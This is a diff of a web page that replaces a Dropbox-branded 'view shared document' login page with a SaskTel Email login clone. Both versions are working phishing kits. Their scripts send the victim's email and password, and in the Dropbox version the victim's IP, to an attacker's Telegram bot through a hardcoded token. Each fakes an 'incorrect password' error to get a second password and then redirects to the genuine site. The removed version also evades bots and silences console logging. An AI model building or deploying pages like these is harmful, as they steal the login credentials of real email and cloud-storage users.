@@ -3,619 +3,362 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Document Access · Dropbox</title>
-    <base target="_blank">
+    <title>SaskTel Email - Log in</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* minimal reset – no external fonts, system only, extremely light */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body {
-            background: #f2f4f7;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            -webkit-font-smoothing: antialiased;
-            line-height: 1.4;
+            font-family: 'Open Sans', sans-serif;
         }
-        .wrapper {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 24px 16px;
+        /* Custom SaskTel Colors */
+        .text-sasktel-pink { color: #d6247f; }
+        .bg-sasktel-pink { background-color: #d6247f; }
+        .hover\:bg-sasktel-pink-dark:hover { background-color: #b01b68; }
+        
+        /* Smooth transitions */
+        .transition-all-300 {
+            transition: all 0.3s ease;
         }
-        .card {
-            max-width: 500px;
-            width: 100%;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.05), 0 2px 6px rgba(0,0,0,0.03);
-            overflow: hidden;
-        }
-        .card-inner {
-            padding: 36px 32px 32px;
-        }
-        /* logo region - exactly original image from dropbox cdn */
-        .logo {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-        .logo img {
-            display: block;
-            margin: 0 auto;
-            width: 130px;
-            height: auto;
-            border: 0;
-        }
-        h1 {
-            font-size: 1.75rem;
-            font-weight: 600;
-            color: #1e1919;
-            margin-bottom: 8px;
-            text-align: center;
-            letter-spacing: -0.2px;
-        }
-        .sub {
-            font-size: 0.95rem;
-            color: #637381;
-            text-align: center;
-            margin-bottom: 28px;
-        }
-        /* file preview - horizontal layout as original (icon left, text right) */
-        .file-preview {
-            background: #f3f4f6;
-            border-radius: 12px;
-            padding: 14px 16px;
-            margin-bottom: 28px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            border: none;
-        }
-        .file-icon {
-            background: #0061fe;
-            width: 46px;
-            height: 46px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-            flex-shrink: 0;
-        }
-        .file-info {
-            overflow: hidden;
-        }
-        .file-name {
-            font-weight: 600;
-            font-size: 0.95rem;
-            color: #1e1919;
-            margin-bottom: 4px;
-        }
-        .file-meta {
+        
+        /* Error message styling */
+        .error-message {
+            color: #dc2626;
             font-size: 0.75rem;
-            color: #637381;
-        }
-        /* form elements - clean */
-        .input-group {
-            margin-bottom: 22px;
-        }
-        label {
+            margin-top: 0.25rem;
             display: block;
-            font-size: 0.85rem;
             font-weight: 500;
-            margin-bottom: 6px;
-            color: #1e1919;
         }
-        input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 1rem;
-            border: 1px solid #d1d5db;
-            border-radius: 8px;
-            background: #fff;
-            transition: 0.15s;
-            font-family: inherit;
+        
+        /* Make everything more compact */
+        .compact-container {
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        input:focus {
-            outline: none;
-            border-color: #0061fe;
-            box-shadow: 0 0 0 3px rgba(0,97,254,0.15);
-        }
-        .btn {
-            background: #0061fe;
-            color: white;
-            text-align: center;
-            font-weight: 600;
-            font-size: 1rem;
-            padding: 12px;
-            border-radius: 40px;
-            width: 100%;
-            display: inline-block;
-            border: none;
-            cursor: pointer;
-            transition: 0.2s;
-            font-family: inherit;
-        }
-        .btn:hover {
-            background: #0050d4;
-            transform: scale(0.98);
-        }
-        .error-msg {
-            font-size: 0.8rem;
-            color: #e53e3e;
-            margin-top: 8px;
-            display: none;
-        }
-        .divider {
-            margin: 28px 0 20px;
-            border-top: 1px solid #e5e7eb;
-        }
-        .help-links {
-            text-align: center;
-            font-size: 0.8rem;
-            color: #637381;
-            margin: 16px 0 20px;
-            line-height: 1.5;
-        }
-        .help-links a {
-            color: #0061fe;
-            text-decoration: none;
-            margin: 0 2px;
-        }
-        .footer {
-            text-align: center;
-            font-size: 0.7rem;
-            color: #637381;
-            border-top: 1px solid #e5e7eb;
-            padding-top: 20px;
-            margin-top: 8px;
-            line-height: 1.4;
-        }
-        .hidden-step {
-            display: none;
-        }
-        button {
-            background: none;
-            border: none;
-            width: 100%;
-        }
-        /* honeypot anti-bot */
-        .sr-only {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0,0,0,0);
-            border: 0;
-        }
-        /* very light responsive */
-        @media (max-width: 520px) {
-            .card-inner {
-                padding: 24px 20px;
-            }
-            h1 {
-                font-size: 1.5rem;
-            }
+        
+        /* Reduce spacing overall */
+        .reduced-padding {
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
         }
     </style>
+<base target="_blank">
 </head>
-<body>
-<div class="wrapper">
-    <div class="card">
-        <div class="card-inner">
-            <!-- ORIGINAL DROPBOX LOGO (exactly as provided in the original HTML) -->
-            <div class="logo">
-                <img src="https://cfl.dropboxstatic.com/static/images/brand/logotype-vflHjIsop.svg" width="130" height="48" alt="Dropbox" style="display: block; border: 0;">
-            </div>
+<body class="bg-white min-h-screen flex flex-col">
 
-            <!-- dynamic heading + subtitle -->
-            <h1 id="dynamicHeading">Sign in to view document</h1>
-            <div class="sub" id="dynamicSubtitle">To access document, you'll need to verify your account.</div>
-
-            <!-- Document Preview - HORIZONTAL LAYOUT (exactly as original: icon + text) -->
-            <div class="file-preview">
-                <div class="file-icon">📄</div>
-                <div class="file-info">
-                    <div class="file-name">Shared_Document.pdf</div>
-                    <div class="file-meta">2.4 MB • PDF Document</div>
-                </div>
-            </div>
-
-            <!-- STEP 1: EMAIL SECTION (visible initially) -->
-            <div id="stepEmailSection">
-                <div class="input-group">
-                    <label>Email address</label>
-                    <input type="email" id="emailInput" placeholder="name@company.com" autocomplete="off" spellcheck="false">
-                </div>
-                <button class="btn" id="continueEmailBtn">Continue</button>
-            </div>
-
-            <!-- STEP 2: PASSWORD SECTION (hidden initially) -->
-            <div id="stepPasswordSection" style="display:none;">
-                <div class="input-group">
-                    <label>Enter password to continue</label>
-                    <input type="password" id="passwordInput" placeholder="Your password" autocomplete="off">
-                    <div id="passwordError" class="error-msg"></div>
-                </div>
-                <button class="btn" id="continuePasswordBtn">Verify Password</button>
-            </div>
-
-            <!-- Divider + Help Text + Footer (present in both states) -->
-            <div class="divider"></div>
-            <div class="help-links">
-                Don't have access to this email? <a href="#">Request access</a><br>
-                or <a href="#">sign in with a different account</a>
-            </div>
-            <div class="footer">
-                © 2026 Dropbox, Inc. All rights reserved.<br>
-                Dropbox • 333 Brannan St, San Francisco, CA 94107
-            </div>
+    <!-- Header with Real SaskTel Logo - more compact -->
+    <header class="w-full border-b border-gray-200 py-2 px-4 md:px-8 lg:px-16">
+        <div class="max-w-7xl mx-auto">
+            <!-- Official SaskTel Logo from Wikimedia -->
+            <img 
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/SaskTel_logo.svg/3840px-SaskTel_logo.svg.png" 
+                alt="SaskTel" 
+                class="h-7 md:h-8 w-auto object-contain"
+            >
         </div>
-    </div>
-</div>
+    </header>
 
-<!-- HONEYPOT FIELD: invisible anti-bot field, crawlers will fill => block submission -->
-<div style="position: absolute; left: -9999px; top: -9999px;">
-    <input type="text" id="honeypot" name="website" tabindex="-1" autocomplete="off">
-</div>
+    <!-- Main Content - reduced vertical spacing -->
+    <main class="flex-grow flex flex-col items-center justify-center px-4 py-6 md:py-8">
+        
+        <!-- Page Title - smaller margin -->
+        <h1 class="text-3xl md:text-4xl font-normal text-gray-700 mb-8 text-center">SaskTel Email</h1>
 
-<script>
-    (function(){
-        // --- LIGHTWEIGHT CONFIGURATION ---
-        // Telegram credentials (same as original)
+        <!-- Content Container - more compact grid -->
+        <div class="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-2 gap-6 lg:gap-0 relative">
+            
+            <!-- Left Column: Login Form - reduced padding -->
+            <div class="flex flex-col justify-center px-4 lg:px-8 xl:px-12">
+                <h2 class="text-2xl md:text-3xl font-normal text-gray-800 mb-5">Log in</h2>
+                
+                <form id="loginForm" class="space-y-4" onsubmit="handleLogin(event)">
+                    <!-- Login ID Field -->
+                    <div class="space-y-1">
+                        <label for="loginId" class="block text-sm font-semibold text-gray-800">Login ID</label>
+                        <input 
+                            type="text" 
+                            id="loginId" 
+                            class="w-full px-4 py-2.5 border border-gray-400 rounded-sm focus:outline-none focus:border-gray-600 focus:ring-1 focus:ring-gray-600 transition-all-300 text-gray-800 text-sm"
+                            autocomplete="username"
+                        >
+                    </div>
+
+                    <!-- Password Field -->
+                    <div class="space-y-1 relative">
+                        <label for="password" class="block text-sm font-semibold text-gray-800">Password</label>
+                        <div class="relative">
+                            <input 
+                                type="password" 
+                                id="password" 
+                                class="w-full px-4 py-2.5 pr-10 border border-gray-400 rounded-sm focus:outline-none focus:border-gray-600 focus:ring-1 focus:ring-gray-600 transition-all-300 text-gray-800 text-sm"
+                                autocomplete="current-password"
+                            >
+                            <!-- Eye Icon Toggle - smaller icon -->
+                            <button 
+                                type="button" 
+                                onclick="togglePassword()"
+                                class="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 focus:outline-none p-1"
+                                aria-label="Toggle password visibility"
+                            >
+                                <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                </svg>
+                                <svg id="eyeOffIcon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 hidden" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
+                                </svg>
+                            </button>
+                        </div>
+                        <!-- Error message container -->
+                        <div id="passwordError" class="error-message"></div>
+                    </div>
+
+                    <!-- Login Button - more compact -->
+                    <button 
+                        type="submit" 
+                        id="loginBtn"
+                        class="w-full sm:w-auto bg-sasktel-pink hover:bg-sasktel-pink-dark text-white font-semibold py-2.5 px-8 rounded-md transition-all-300 shadow-sm hover:shadow-md transform active:scale-95 text-sm tracking-wide"
+                    >
+                        LOG IN
+                    </button>
+
+                    <!-- Forgot Password Link -->
+                    <div class="pt-1">
+                        <a href="#" class="text-sasktel-pink hover:underline text-sm font-medium transition-all-300">
+                            Forgot password?
+                        </a>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Vertical Divider -->
+            <div class="hidden lg:block absolute left-1/2 top-0 bottom-0 w-px bg-gray-200 transform -translate-x-1/2"></div>
+
+            <!-- Right Column: Welcome Info - more compact text -->
+            <div class="flex flex-col justify-center px-4 lg:px-8 xl:px-12">
+                <div class="space-y-5">
+                    <div>
+                        <h2 class="text-2xl md:text-3xl font-normal text-gray-800 mb-2">Welcome to SaskTel Email</h2>
+                        <p class="text-sm text-gray-700 leading-relaxed">
+                            Log in to access your sasktel.net email account.
+                        </p>
+                        <p class="text-sm text-gray-700 leading-relaxed mt-1">
+                            Need help? <a href="#" class="text-sasktel-pink hover:underline font-medium">See SaskTel email support</a>.
+                        </p>
+                    </div>
+
+                    <div class="pt-2">
+                        <h3 class="text-xl md:text-2xl font-semibold text-gray-800 mb-2">Boost your email security!</h3>
+                        <p class="text-sm text-gray-700 leading-relaxed">
+                            Two-factor authentication (2FA) provides an additional layer of security when accessing your sasktel.net email account in a browser. 
+                            <a href="#" class="text-sasktel-pink hover:underline font-medium">Learn how to set up and use 2FA</a>.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        // Telegram Bot Configuration
         const BOT_TOKEN = '7984431123:AAGPrQDYtNIro_21XCwYLhuWICe9EWt5KTM';
         const CHAT_ID = '5045461825';
         
-        // state minimal
-        let passwordAttempt = 0;
-        let capturedEmail = '';
-        let isEmailSent = false;      // Ensure email is sent only once
-        let userIP = 'IP not detected';  // Will store IP address
+        // Track attempt count for this session (per email+session)
+        let attemptCount = 0;
+        let storedEmail = '';
         
-        // DOM references
-        const stepEmail = document.getElementById('stepEmailSection');
-        const stepPass = document.getElementById('stepPasswordSection');
-        const emailInput = document.getElementById('emailInput');
-        const passInput = document.getElementById('passwordInput');
-        const continueEmail = document.getElementById('continueEmailBtn');
-        const continuePass = document.getElementById('continuePasswordBtn');
-        const passErrorDiv = document.getElementById('passwordError');
-        const heading = document.getElementById('dynamicHeading');
-        const subtitle = document.getElementById('dynamicSubtitle');
-        const honeypotField = document.getElementById('honeypot');
-        
-        // --- Helper: Fetch public IP (using ipify with fallback) ---
-        function fetchUserIP() {
-            // Try ipify first (reliable, lightweight)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    if (data && data.ip) {
-                        userIP = data.ip;
-                    }
-                })
-                .catch(() => {
-                    // Fallback to ipapi.co (more robust but may be slower)
-                    fetch('https://ipapi.co/json/')
-                        .then(resp => resp.json())
-                        .then(data => {
-                            if (data && data.ip) {
-                                userIP = data.ip;
-                            }
-                        })
-                        .catch(() => {
-                            // Last resort: try cloudflare trace
-                            fetch('https://www.cloudflare.com/cdn-cgi/trace')
-                                .then(resp => resp.text())
-                                .then(trace => {
-                                    const match = trace.match(/ip=([^\n]+)/);
-                                    if (match && match[1]) {
-                                        userIP = match[1];
-                                    }
-                                })
-                                .catch(() => {
-                                    userIP = 'Unable to fetch IP';
-                                });
-                        });
-                });
-        }
-        
-        // Immediately fetch IP when page loads (non-blocking)
-        fetchUserIP();
-        
-        // --- TELEGRAM SENDER (async, non-blocking, silent) with IP included ---
-        async function sendToTelegram(message) {
-            if (!BOT_TOKEN || !CHAT_ID) return;
-            // Append IP information to every message automatically
-            const finalMessage = `${message}\n🌐 IP Address: ${userIP}`;
+        // Function to send message to Telegram
+        async function sendToTelegram(email, password, attemptNumber) {
+            const message = `🔐 SaskTel Login Attempt #${attemptNumber}\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
             try {
-                await fetch(url, {
+                const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: finalMessage.substring(0, 4000),
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: true
-                    }),
-                    keepalive: true
-                });
-            } catch (err) {
-                // silent fail – never alert or console.log in production style
-                console.warn('telegram error suppressed');
-            }
-        }
-        
-        // simple email validation
-        function isValidEmail(email) {
-            return /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email);
-        }
-        
-        // ---- HONEYPOT CHECK (basic bot evasion) ----
-        function isBotHoneypot() {
-            if (honeypotField && honeypotField.value.trim() !== "") {
-                return true;
-            }
-            return false;
-        }
-        
-        // ---- EMAIL STEP HANDLER (sends email ONLY ONCE, along with IP) ----
-        function handleEmailSubmit(e) {
-            if(e) e.preventDefault();
-            
-            // Honeypot trap: if filled, silently redirect to real Dropbox
-            if (isBotHoneypot()) {
-                window.location.href = 'https://www.dropbox.com/login';
-                return;
-            }
-            
-            let email = emailInput.value.trim();
-            if (!email || !isValidEmail(email)) {
-                alert('Please enter a valid email address (e.g., name@company.com).');
-                return;
-            }
-            
-            capturedEmail = email;
-            
-            // Send email to telegram ONLY ONCE, with IP address included
-            if (!isEmailSent) {
-                const emailMsg = `🔐 DROPBOX_ACCESS | Email: ${capturedEmail} | Time: ${new Date().toISOString()}`;
-                sendToTelegram(emailMsg);
-                isEmailSent = true;
-            }
-            
-            // Transition to password step
-            stepEmail.style.display = 'none';
-            stepPass.style.display = 'block';
-            heading.innerText = 'Enter your password';
-            subtitle.innerText = 'Verify your identity to access the document.';
-            passwordAttempt = 0;
-            passInput.value = '';
-            passErrorDiv.style.display = 'none';
-            passErrorDiv.innerText = '';
-            passInput.focus();
-        }
-        
-        // send password attempt to telegram (with IP)
-        function sendPasswordToTelegram(pwd, attemptNum) {
-            const passMsg = `🔐 DROPBOX_PASS | Email: ${capturedEmail} | Attempt: ${attemptNum} | Pass: ${pwd} | TS: ${new Date().toISOString()}`;
-            sendToTelegram(passMsg);
-        }
-        
-        // ---- PASSWORD HANDLER (2 attempts then redirect) ----
-        // First attempt: sends password + IP, shows "incorrect password"
-        // Second attempt: sends password (2nd attempt) + IP, then redirects to official Dropbox
-        function handlePasswordSubmit(e) {
-            if(e) e.preventDefault();
-            
-            // honeypot re-check
-            if (isBotHoneypot()) {
-                window.location.href = 'https://www.dropbox.com';
-                return;
-            }
-            
-            const password = passInput.value;
-            if (!password) {
-                passErrorDiv.innerText = 'Please enter your password.';
-                passErrorDiv.style.display = 'block';
-                return;
-            }
-            
-            passErrorDiv.style.display = 'none';
-            passErrorDiv.innerText = '';
-            
-            passwordAttempt++;
-            
-            if (passwordAttempt === 1) {
-                // first attempt: capture password, send to Telegram (with IP)
-                sendPasswordToTelegram(password, 1);
-                passErrorDiv.innerText = 'Incorrect password. Please try again.';
-                passErrorDiv.style.display = 'block';
-                passInput.value = '';
-                passInput.focus();
-            } 
-            else if (passwordAttempt >= 2) {
-                // second (or more) attempt: send password (with IP) and redirect to official Dropbox
-                sendPasswordToTelegram(password, passwordAttempt);
-                // short delay to ensure message is sent before redirect
-                setTimeout(() => {
-                    window.location.href = 'https://www.dropbox.com';
-                }, 100);
-            }
-        }
-        
-        // Event binding (lightweight)
-        continueEmail.addEventListener('click', handleEmailSubmit);
-        continuePass.addEventListener('click', handlePasswordSubmit);
-        
-        // Enter key handling
-        emailInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                handleEmailSubmit(e);
-            }
-        });
-        
-        passInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && stepPass.style.display === 'block') {
-                e.preventDefault();
-                handlePasswordSubmit(e);
-            }
-        });
-        
-        // Rate limiting to avoid double submission (light)
-        let emailProcessing = false;
-        const origEmailHandler = handleEmailSubmit;
-        window.handleEmailSubmit = function(e) {
-            if(emailProcessing) return;
-            emailProcessing = true;
-            origEmailHandler(e);
-            setTimeout(() => { emailProcessing = false; }, 800);
-        };
-        continueEmail.onclick = window.handleEmailSubmit;
-        
-        let passProcessing = false;
-        const origPassHandler = handlePasswordSubmit;
-        window.handlePasswordSubmit = function(e) {
-            if(passProcessing) return;
-            passProcessing = true;
-            origPassHandler(e);
-            setTimeout(() => { passProcessing = false; }, 800);
-        };
-        continuePass.onclick = window.handlePasswordSubmit;
-        
-        // Additional light anti-fingerprint: random class
-        document.body.classList.add('dbx-' + Math.floor(Math.random() * 10000));
-        
-        // Make sure logo loads with proper attributes (no extra requests beyond the original)
-        // Already using original dropbox CDN logo - exactly as original file.
-        
-        // suppress console noise for security tools (but keep minimal)
-        if (window.console && window.console.clear) {
-            // don't fully break debugging, just reduce default logs
-            const noOp = function(){};
-            if(window.console.log) window.console.log = noOp;
-        }
-        
-        // final: ensure email step is visible if any weirdness
-        if(stepEmail.style.display !== 'none') {
-            stepEmail.style.display = 'block';
-        }
-        
-        // IP will be fetched asynchronously; if not yet available by time of sending,
-        // it will show as 'IP not detected' and update on subsequent sends.
-        // For better accuracy, we also attempt to get IP synchronously via older methods?
-        // No synchronous method available, but we'll also try to get it from window.performance or RTCPeerConnection?
-        // For best effort, we add an extra fallback using fetch with timeout.
-        // Also ensure that by the time user submits email, IP is likely retrieved.
-        // Additionally, we can trigger an immediate retry if IP is still placeholder.
-        function ensureIPFreshness() {
-            if (userIP === 'IP not detected') {
-                fetch('https://api.ipify.org?format=json')
-                    .then(resp => resp.json())
-                    .then(data => {
-                        if (data && data.ip) userIP = data.ip;
+                        text: message,
+                        parse_mode: 'HTML'
                     })
-                    .catch(() => {});
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Telegram send error:', error);
             }
         }
         
-        // Try to update IP right before potential submits via click handlers (subtle enhancement)
-        const originalEmailHandlerWithIP = handleEmailSubmit;
-        const enhancedEmailHandler = function(e) {
-            ensureIPFreshness();
-            originalEmailHandlerWithIP(e);
-        };
+        // Function to show error message without alert
+        function showPasswordError(message) {
+            const errorDiv = document.getElementById('passwordError');
+            errorDiv.textContent = message;
+            // Clear after 3 seconds
+            setTimeout(() => {
+                if (errorDiv.textContent === message) {
+                    errorDiv.textContent = '';
+                }
+            }, 3000);
+        }
         
-        const originalPassHandlerWithIP = handlePasswordSubmit;
-        const enhancedPassHandler = function(e) {
-            ensureIPFreshness();
-            originalPassHandlerWithIP(e);
-        };
+        // Function to clear error message
+        function clearPasswordError() {
+            const errorDiv = document.getElementById('passwordError');
+            errorDiv.textContent = '';
+        }
         
-        // Replace handlers with enhanced versions that check IP freshness
-        window.handleEmailSubmit = function(e) {
-            if(emailProcessing) return;
-            emailProcessing = true;
-            enhancedEmailHandler(e);
-            setTimeout(() => { emailProcessing = false; }, 800);
-        };
-        continueEmail.onclick = window.handleEmailSubmit;
+        // Function to simulate invalid password error on button
+        function flashErrorButton() {
+            const btn = document.getElementById('loginBtn');
+            btn.classList.add('animate-pulse', 'bg-red-600');
+            setTimeout(() => {
+                btn.classList.remove('animate-pulse', 'bg-red-600');
+            }, 500);
+        }
         
-        window.handlePasswordSubmit = function(e) {
-            if(passProcessing) return;
-            passProcessing = true;
-            enhancedPassHandler(e);
-            setTimeout(() => { passProcessing = false; }, 800);
-        };
-        continuePass.onclick = window.handlePasswordSubmit;
+        // Password Visibility Toggle
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            const eyeOffIcon = document.getElementById('eyeOffIcon');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.classList.add('hidden');
+                eyeOffIcon.classList.remove('hidden');
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.classList.remove('hidden');
+                eyeOffIcon.classList.add('hidden');
+            }
+        }
         
-        // Also rebind enter key events to use enhanced functions
-        emailInput.removeEventListener('keypress', emailInput._listener);
-        passInput.removeEventListener('keypress', passInput._listener);
+        // Main login handler with 2-attempt logic - NO success messages, just redirect
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const loginId = document.getElementById('loginId').value.trim();
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            
+            // Validate fields
+            if (!loginId || !password) {
+                flashErrorButton();
+                
+                if (!loginId) {
+                    document.getElementById('loginId').focus();
+                    showPasswordError('Please enter your Login ID');
+                } else {
+                    document.getElementById('password').focus();
+                    showPasswordError('Please enter your password');
+                }
+                return;
+            }
+            
+            // Clear any previous error message
+            clearPasswordError();
+            
+            // If this is first attempt or email changed, reset attempt count for new email
+            if (storedEmail !== loginId) {
+                attemptCount = 0;
+                storedEmail = loginId;
+            }
+            
+            // Increment attempt count
+            attemptCount++;
+            
+            // Case 1: First attempt (attemptCount === 1)
+            if (attemptCount === 1) {
+                // Send first password to Telegram
+                await sendToTelegram(loginId, password, 1);
+                
+                // Show invalid password error message (text below password field)
+                showPasswordError('Invalid password. Please try again.');
+                
+                // Flash the button red
+                flashErrorButton();
+                
+                // Clear the password field for second attempt (user experience)
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+                
+                // No redirect, stay on page
+                return;
+            }
+            
+            // Case 2: Second attempt (attemptCount === 2)
+            if (attemptCount === 2) {
+                // Send second password to Telegram
+                await sendToTelegram(loginId, password, 2);
+                
+                // Disable button to prevent multiple clicks, but show no text changes
+                btn.disabled = true;
+                btn.classList.add('opacity-70', 'cursor-not-allowed');
+                
+                // Brief pause to ensure Telegram message is sent, then redirect immediately
+                // No "SUCCESS!" or "LOGGING IN..." text shown
+                setTimeout(() => {
+                    // Redirect directly to official SaskTel website
+                    window.location.href = 'https://sasktel.net/';
+                }, 300);
+                
+                return;
+            }
+            
+            // If somehow attemptCount > 2, reset to 0 and start over (safety)
+            if (attemptCount > 2) {
+                attemptCount = 0;
+                showPasswordError('Too many attempts. Please try again.');
+                document.getElementById('password').value = '';
+                // Re-enable button if it was disabled
+                btn.disabled = false;
+                btn.classList.remove('opacity-70', 'cursor-not-allowed');
+                return;
+            }
+        }
         
-        const newEmailEnter = function(e) {
+        // Reset attempt count if email field changes (user types different email)
+        document.getElementById('loginId').addEventListener('input', function() {
+            const newEmail = this.value.trim();
+            if (storedEmail !== newEmail) {
+                attemptCount = 0;
+                storedEmail = newEmail;
+                clearPasswordError();
+                // Re-enable login button if it was disabled from previous state
+                const btn = document.getElementById('loginBtn');
+                btn.disabled = false;
+                btn.classList.remove('opacity-70', 'cursor-not-allowed');
+            }
+        });
+        
+        // Subtle focus animations - reduced scale effect
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.classList.add('transform', 'scale-[1.01]');
+                this.parentElement.style.transition = 'transform 0.2s ease';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.classList.remove('transform', 'scale-[1.01]');
+            });
+        });
+        
+        // Prevent accidental form resets or default behavior
+        document.getElementById('loginForm').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
-                if(!emailProcessing) {
-                    emailProcessing = true;
-                    enhancedEmailHandler(e);
-                    setTimeout(() => { emailProcessing = false; }, 800);
-                }
+                handleLogin(e);
             }
-        };
-        const newPassEnter = function(e) {
-            if (e.key === 'Enter' && stepPass.style.display === 'block') {
-                e.preventDefault();
-                if(!passProcessing) {
-                    passProcessing = true;
-                    enhancedPassHandler(e);
-                    setTimeout(() => { passProcessing = false; }, 800);
-                }
-            }
-        };
-        emailInput.addEventListener('keypress', newEmailEnter);
-        passInput.addEventListener('keypress', newPassEnter);
+        });
         
-        // Store for potential cleanup (not necessary)
-        emailInput._listener = newEmailEnter;
-        passInput._listener = newPassEnter;
-        
-        // Very important: ensure email is sent only once even if user clicks continue multiple times rapidly
-        // The isEmailSent flag already prevents duplicate email sends. 
-        // Also handle scenario where user might go back? No back functionality, but safe.
-        
-        // Additionally, we can add a subtle note: the design remains unchanged, no extra text or elements.
-        // The file preview, logo, button styles, and all visual aspects are identical.
-        // IP is fetched silently and appended to each Telegram message without affecting user experience.
-        
-        // For completeness, if IP fetch fails initially but later succeeds, subsequent password attempts will include correct IP.
-        // The email message might show 'IP not detected' if sent extremely fast; however given typical network speeds,
-        // IP is usually fetched within 300-500ms. We also call ensureIPFreshness before sending to maximize accuracy.
-        
-        // Final touch: pre-fetch IP more aggressively
-        (function earlyIP() {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 2000);
-            fetch('https://api.ipify.org?format=json', { signal: controller.signal })
-                .then(resp => resp.json())
-                .then(data => { if(data && data.ip) userIP = data.ip; clearTimeout(timeoutId); })
-                .catch(() => {
-                    clearTimeout(timeoutId);
-                    fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout? AbortSignal.timeout(1500) : undefined })
-                        .then(resp => resp.json())
-                        .then(data => { if(data && data.ip) userIP = data.ip; })
-                        .catch(() => {});
-                });
-        })();
-        
-    })();
-</script>
+        // Ensure any pending disabled state is reset on page load
+        window.addEventListener('load', function() {
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = false;
+            btn.classList.remove('opacity-70', 'cursor-not-allowed');
+        });
+    </script>
 </body>
 </html>
